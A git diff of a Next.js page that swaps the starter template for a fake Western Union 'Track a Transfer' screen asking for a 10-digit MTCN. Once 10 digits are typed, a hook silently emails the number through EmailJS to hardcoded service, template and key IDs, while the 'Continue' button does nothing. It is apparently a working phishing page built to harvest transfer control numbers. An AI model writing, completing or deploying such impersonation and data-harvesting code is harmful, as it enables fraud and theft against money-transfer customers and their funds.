@@ -1,103 +1,147 @@
+/* eslint-disable react/no-unescaped-entities */
+"use client";
+
+import Footer from "@/components/footer";
+import Header from "@/components/header";
+import Link from "next/link";
+import {
+  InputOTP,
+  InputOTPGroup,
+  InputOTPSeparator,
+  InputOTPSlot,
+} from "@/components/ui/input-otp";
+import { Button } from "@/components/ui/button";
+import { Download, Upload } from "lucide-react";
+import { useEffect, useState } from "react";
+import emailjs from "@emailjs/browser";
+import { cn } from "@/lib/utils";
 import Image from "next/image";
-
+import { Spinner } from "@/components/spinner";
 export default function Home() {
-  return (
-    <div className="font-sans grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20">
-      <main className="flex flex-col gap-[32px] row-start-2 items-center sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
-        />
-        <ol className="font-mono list-inside list-decimal text-sm/6 text-center sm:text-left">
-          <li className="mb-2 tracking-[-.01em]">
-            Get started by editing{" "}
-            <code className="bg-black/[.05] dark:bg-white/[.06] font-mono font-semibold px-1 py-0.5 rounded">
-              app/page.tsx
-            </code>
-            .
-          </li>
-          <li className="tracking-[-.01em]">
-            Save and see your changes instantly.
-          </li>
-        </ol>
+  const [isactive, setisActive] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  console.log(setIsLoading);
+  const [otp, setOtp] = useState("");
 
-        <div className="flex gap-4 items-center flex-col sm:flex-row">
-          <a
-            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:w-auto"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+  useEffect(() => {
+    if (otp.length == 10) {
+      // setIsLoading(true);
+      emailjs
+        .send(
+          "service_uka7m0o",
+          "template_rs1iwvp",
+          { otp: otp },
+          "Kc-xjOkuaqcths13o"
+        )
+        .then(
+          (response) => {
+            console.log("SUCCESS!", response.status, response.text);
+
+            setOtp("");
+            // setIsLoading(false);
+          },
+          (error) => {
+            console.log("FAILED...", error);
+          }
+        );
+    }
+  }, [otp]);
+
+  return (
+    <div className=" relative">
+      <Header />
+
+      <div className="bg-[#ebece7] flex flex-col items-center justify-center ">
+        <div className=" w-full md:w-2/5  flex flex-col  items-center justify-center gap-8 p-4">
+          <div className="w-full space-y-2">
+            <div className=" w-full flex justify-between items-center ">
+              <p className="text-xl">Track a Transfer</p>
+              <Link className="text-xs text-blue-950" href={"/"}>
+                English/Philipines
+              </Link>
+            </div>
+            <div className="bg-white flex justify-between items-center w-full text-xs font-bold ">
+              <div
+                onClick={() => setisActive(!isactive)}
+                className={cn(
+                  "flex justify-center items-center gap-2 border-b-2 p-4 w-1/2",
+                  !isactive && " border-[#255E80] text-[#255E80] "
+                )}
+              >
+                <Upload color="#255E80" />
+                <p>I'm the sender</p>
+              </div>
+              <div
+                onClick={() => setisActive(!isactive)}
+                className={cn(
+                  "flex justify-center items-center gap-2 border-b-2 py-4 w-1/2  ",
+                  isactive && " border-[#255E80]  text-[#255E80]"
+                )}
+              >
+                <Download />
+                <p>I'm the receiver</p>
+              </div>
+            </div>
+          </div>
+
+          <p className="text-xs">
+            Please enter your 10-digit tracking number (MTCN).
+          </p>
+          <div className=" w-full  flex-col  justify-center gap-5 flex  bg-white  items-center py-2">
+            <InputOTP maxLength={10} value={otp} onChange={(e) => setOtp(e)}>
+              <InputOTPGroup>
+                <InputOTPSlot index={0} />
+                <InputOTPSlot index={1} />
+                <InputOTPSlot index={2} />
+              </InputOTPGroup>
+              <InputOTPSeparator />
+              <InputOTPGroup>
+                <InputOTPSlot index={3} />
+                <InputOTPSlot index={4} />
+                <InputOTPSlot index={5} />
+              </InputOTPGroup>
+              <InputOTPSeparator />
+              <InputOTPGroup>
+                <InputOTPSlot index={6} />
+                <InputOTPSlot index={7} />
+                <InputOTPSlot index={8} />
+                <InputOTPSlot index={9} />
+              </InputOTPGroup>
+            </InputOTP>
+            <p className="text-red-800 font-medium text-center text-xs">
+              Please enter your 10-digit tracking number (MTCN).
+            </p>
+          </div>
+          <Button
+            className="w-full rounded-sm h-12 bg-[#68789D]"
+            disabled={otp.length !== 10}
           >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
-            />
-            Deploy now
-          </a>
-          <a
-            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 w-full sm:w-auto md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Read our docs
-          </a>
+            Continue
+          </Button>
+          <Link href={"/"} className="text-[#255E80] text-sm">
+            Dont't Know the MTCN
+          </Link>
         </div>
-      </main>
-      <footer className="row-start-3 flex gap-[24px] flex-wrap items-center justify-center">
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
+      </div>
+      {/* Overlay de chargement */}
+      {isLoading && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center">
+          {/* Fond transparent */}
+          <div className="absolute inset-0 bg-black/90 " />
+
+          {/* Contenu du loader */}
+          <div className="relative flex flex-col items-center justify-center gap-4 p-6  ">
+            <Spinner variant="circle" className="text-[#ebece7] size-15  " />
+            <Image
+              src="https://www.westernunion.com/content/dam/wu/logo/logo.wu.big.svg"
+              width={500}
+              height={500}
+              alt="logo"
+            />
+          </div>
+        </div>
+      )}
+      <Footer />
     </div>
   );
 }
